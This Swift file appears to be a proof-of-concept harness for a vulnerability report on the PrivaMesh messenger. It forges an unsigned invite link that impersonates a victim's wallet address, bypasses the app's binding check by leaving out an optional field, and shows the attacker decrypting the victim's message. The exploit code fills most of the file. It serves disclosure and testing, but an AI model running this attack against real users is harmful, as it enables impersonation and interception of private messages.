//
//  main.swift — r415-privamesh interop harness
//
//  Runs the REAL app source (ContactCard.swift, PrekeyBundle.swift,
//  InviteLink.swift, CryptoBox.swift, copied byte-identical from
//  github.com/Makomest/PrivaMesh @ afb5ef9) on Apple Foundation + CryptoKit.
//
//  Two jobs:
//    A) decode a link produced outside the app (the Python generator) and walk
//       the same steps InviteInbox.accept / AddContactView.addFromQR take
//    B) run the whole attack natively — attacker identity -> card -> link ->
//       victim adds contact -> victim encrypts -> attacker decrypts
//
//  Exit code 0 only if every assertion holds.
//

import Foundation
import CryptoKit
import SolanaSwift
import TweetNacl

var failures = 0

func check(_ label: String, _ ok: Bool, _ detail: String = "") {
    let mark = ok ? "PASS" : "FAIL"
    print("[\(mark)] \(label)\(detail.isEmpty ? "" : "  — \(detail)")")
    if !ok { failures += 1 }
}

func section(_ title: String) {
    print("\n=== \(title) ===")
}

func hex(_ d: Data) -> String { d.map { String(format: "%02x", $0) }.joined() }

// MARK: - Attacker identity

struct AttackerIdentity {
    let dhIK: Curve25519.KeyAgreement.PrivateKey
    let sigIK: Curve25519.Signing.PrivateKey
    let spk: Curve25519.KeyAgreement.PrivateKey

    init() throws {
        dhIK = Curve25519.KeyAgreement.PrivateKey()
        sigIK = Curve25519.Signing.PrivateKey()
        spk = Curve25519.KeyAgreement.PrivateKey()
    }

    /// The bundle the attacker publishes. Note: no walletAddress, no walletSignature.
    func bundle() throws -> PrekeyBundle {
        let sig = try sigIK.signature(for: spk.publicKey.rawRepresentation)
        return PrekeyBundle(
            dhIdentityKey: dhIK.publicKey.rawRepresentation,
            signedPrekeyPublic: spk.publicKey.rawRepresentation,
            signedPrekeySignature: Data(sig),
            oneTimePrekeyPublic: nil,
            signingIdentityKey: sigIK.publicKey.rawRepresentation
        )
    }

    /// Same bundle, but with the victim's address claimed and NO signature.
    func bundleClaiming(address: String) throws -> PrekeyBundle {
        var b = try bundle()
        b.walletAddress = address
        return b
    }
}

// MARK: - The guard under test, copied from AddContactView.addFromQR

/// `AddContactView.swift:601` — the only ownership check on the QR/invite path.
func addFromQRGuard(bundle: PrekeyBundle, cardAddress: String) -> (passed: Bool, why: String) {
    if bundle.walletAddress != nil {
        if !bundle.isBoundTo(address: cardAddress) {
            return (false, "walletAddress present but isBoundTo() == false -> rejected")
        }
        return (true, "walletAddress present and isBoundTo() == true")
    }
    return (true, "walletAddress == nil -> binding check SKIPPED")
}

// MARK: - Part A — decode a link built outside the app

let externalLink = CommandLine.arguments.count > 1 ? CommandLine.arguments[1] : nil

if let linkString = externalLink {
    section("PART A — decode externally generated link")
    print("link: \(linkString.prefix(72))…  (\(linkString.count) chars)")

    guard let url = URL(string: linkString) else {
        print("[FAIL] link is not a valid URL")
        exit(2)
    }

    let rawPayload = InviteLink.payload(from: url)
    check("InviteLink.payload(from:) extracts payload", rawPayload != nil,
          rawPayload.map { "\($0.count) chars" } ?? "nil")

    if let raw = rawPayload {
        let standard = InviteLink.base64Standard(raw)
        let card = ContactCard.fromQRPayload(standard)
        check("ContactCard.fromQRPayload() decodes (real NSData zlib inflate)", card != nil)

        if let card {
            check("card.hasValidAddress", card.hasValidAddress, card.address)
            check("InviteInbox would accept + prefill nickname", card.profile?.nickname != nil,
                  "nickname = \(card.profile?.nickname ?? "nil")")
            if let bundle = try? PrekeyBundle.fromBase64(card.bundle) {
                check("bundle carries NO walletAddress (field omitted)", bundle.walletAddress == nil,
                      "walletAddress = \(bundle.walletAddress ?? "nil")")
                let g = addFromQRGuard(bundle: bundle, cardAddress: card.address)
                print("       guard verdict: \(g.passed ? "ACCEPTED" : "REJECTED") — \(g.why)")
                check("unsigned invite card is ACCEPTED by addFromQR", g.passed, g.why)
            } else {
                check("PrekeyBundle.fromBase64", false)
            }
        }
    }
} else {
    print("(no external link given — skipping Part A)")
}

// MARK: - Part B — full attack, natively

section("PART B — native end-to-end attack")

let victimWallet = Curve25519.Signing.PrivateKey()          // victim's real wallet key
let victimAddress = SolanaAddress.string(from: victimWallet.publicKey.rawRepresentation)
print("victim wallet address: \(victimAddress)")

let attacker = try AttackerIdentity()
let attackerBundle = try attacker.bundle()

var attackCard = ContactCard(address: victimAddress, bundle: attackerBundle.base64Encoded)
attackCard.profile = ProfileSnapshot(nickname: "Alice")
let attackLink = InviteLink.url(for: attackCard)!
print("attack link: \(attackLink.absoluteString.prefix(72))…  (\(attackLink.absoluteString.count) chars)")

// --- victim side: the app receives this link
guard let url = URL(string: attackLink.absoluteString),
      let raw = InviteLink.payload(from: url) else {
    print("[FAIL] payload extraction failed"); exit(2)
}
let standard = InviteLink.base64Standard(raw)
guard let receivedCard = ContactCard.fromQRPayload(standard) else {
    print("[FAIL] card decode failed"); exit(2)
}
check("victim decodes attacker card", true, receivedCard.address)
check("victim sees address == victim's own wallet", receivedCard.address == victimAddress)
check("victim sees nickname 'Alice' (attacker-chosen)", receivedCard.profile?.nickname == "Alice")

guard let receivedBundle = try? PrekeyBundle.fromBase64(receivedCard.bundle) else {
    print("[FAIL] bundle decode failed"); exit(2)
}

// bundle.verify() — the only signature check the app runs
var verifyPassed = true
do { try receivedBundle.verify() } catch { verifyPassed = false }
check("PrekeyBundle.verify() PASSES on attacker bundle", verifyPassed,
      "attacker signed its own SPK with its own signing key")

check("bundle.walletAddress is nil", receivedBundle.walletAddress == nil)
check("bundle.walletSignature is nil", receivedBundle.walletSignature == nil)

let guardResult = addFromQRGuard(bundle: receivedBundle, cardAddress: receivedCard.address)
check("addFromQR ACCEPTS the attacker bundle", guardResult.passed, guardResult.why)

// Control 1: a properly bound bundle IS accepted — guard isn't broken, it's bypassed
let legitBundle = try victimBundle(for: victimWallet)
check("control: wallet-signed bundle passes isBoundTo", legitBundle.isBoundTo(address: victimAddress))

// Control 2: attacker claiming the address WITHOUT a signature is rejected —
// so the bypass depends purely on omitting the optional field.
let claimed = try attacker.bundleClaiming(address: victimAddress)
check("control: unsigned bundle that CLAIMS the address is rejected",
      !claimed.isBoundTo(address: victimAddress))
let claimedGuard = addFromQRGuard(bundle: claimed, cardAddress: victimAddress)
check("control: claiming the address triggers the guard (rejected)", !claimedGuard.passed, claimedGuard.why)

// --- victim sends a message: X3DH with the attacker's bundle
let victimIdentity = Curve25519.KeyAgreement.PrivateKey()
let victimEphemeral = Curve25519.KeyAgreement.PrivateKey()

let senderSK = try X3DH.senderSharedSecret(
    myIdentityKey: victimIdentity,
    myEphemeralKey: victimEphemeral,
    remoteBundle: receivedBundle)

let attackerSK = try X3DH.receiverSharedSecret(
    myIdentityKey: attacker.dhIK,
    mySignedPrekey: attacker.spk,
    senderIdentityKeyPublic: victimIdentity.publicKey.rawRepresentation,
    senderEphemeralKeyPublic: victimEphemeral.publicKey.rawRepresentation)

check("X3DH shared secrets match (victim -> attacker bundle)", senderSK == attackerSK,
      "SK = \(hex(senderSK).prefix(16))…")

// --- victim encrypts a message with that SK; attacker decrypts it
let plaintext = Data("meet me at 9, bring the seed phrase backup".utf8)
let sealed = try CryptoBox.encrypt(plaintext: plaintext, key: senderSK)
let recovered = try CryptoBox.decrypt(combined: sealed, key: attackerSK)
check("attacker decrypts victim's message", recovered == plaintext,
      "\"\(String(decoding: recovered, as: UTF8.self))\"")

// --- and the reverse is NOT possible: attacker cannot sign as the victim's wallet
let probe = Data("anything".utf8)
let attackerSig = try attacker.sigIK.signature(for: probe)
let forgedValid = (try? NaclSign.signDetachedVerify(
    message: probe, sig: Data(attackerSig),
    publicKey: victimWallet.publicKey.rawRepresentation)) ?? false
check("attacker cannot forge a wallet signature for the victim address", !forgedValid,
      "no victim wallet key -> cannot sign as the victim")

section("SUMMARY")
print("failures: \(failures)")
print("attacker dh identity (public): \(hex(attacker.dhIK.publicKey.rawRepresentation))")
print("attacker SPK (public):         \(hex(attacker.spk.publicKey.rawRepresentation))")
print("attacker signing identity:     \(hex(attacker.sigIK.publicKey.rawRepresentation))")
print("victim address used:           \(victimAddress)")
exit(failures == 0 ? 0 : 1)

// MARK: - helpers

/// A bundle genuinely bound to the victim wallet — the shape a real contact card has.
func victimBundle(for wallet: Curve25519.Signing.PrivateKey) throws -> PrekeyBundle {
    let dh = Curve25519.KeyAgreement.PrivateKey()
    let sig = Curve25519.Signing.PrivateKey()
    let spk = Curve25519.KeyAgreement.PrivateKey()
    let spkSig = try sig.signature(for: spk.publicKey.rawRepresentation)
    let raw = try PrekeyBundle(
        dhIdentityKey: dh.publicKey.rawRepresentation,
        signedPrekeyPublic: spk.publicKey.rawRepresentation,
        signedPrekeySignature: Data(spkSig),
        oneTimePrekeyPublic: nil,
        signingIdentityKey: sig.publicKey.rawRepresentation
    )
    var secret = wallet.rawRepresentation                    // 32-byte Ed25519 seed
    secret.append(wallet.publicKey.rawRepresentation)        // 32-byte public key
    let address = SolanaAddress.string(from: wallet.publicKey.rawRepresentation)
    return raw.walletSigned(address: address, keypair: KeyPair(secretKey: secret))
}
